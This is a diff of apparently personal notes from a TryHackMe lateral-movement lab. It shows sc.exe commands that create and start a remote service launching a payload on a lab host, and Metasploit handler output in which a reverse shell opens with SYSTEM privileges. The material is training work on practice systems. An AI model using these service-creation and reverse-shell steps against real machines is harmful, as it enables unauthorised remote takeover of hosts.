@@ -42,4 +42,21 @@ Started reverse TCP handler on 10.10.10.16:4444</pre>
 <pre>sc.exe \\thmiis.za.tryhackme.com create THMservice-3249 binPath= "%windir%\myservice.exe" start= auto  
 sc.exe \\thmiis.za.tryhackme.com start THMservice-3249</pre>
 
+- Receive reverse shell on msfconsole session
+<pre>msf6 exploit(multi/handler) > exploit
+
+[*] Started reverse TCP handler on 10.50.119.158:4444 
+[*] Sending stage (240 bytes) to 10.200.122.201
+[*] Command shell session 1 opened (10.50.119.158:4444 -> 10.200.122.201:61780) at 2023-11-21 12:43:46 -0500
+-
+
+Shell Banner:
+Microsoft Windows [Version 10.0.17763.1098]
+-----
+          
+
+C:\Windows\system32>whoami
+whoami
+nt authority\system</pre>
+
 ![Alt text](<../../Images/Spawn Process Remotely Diagram.jpg>)
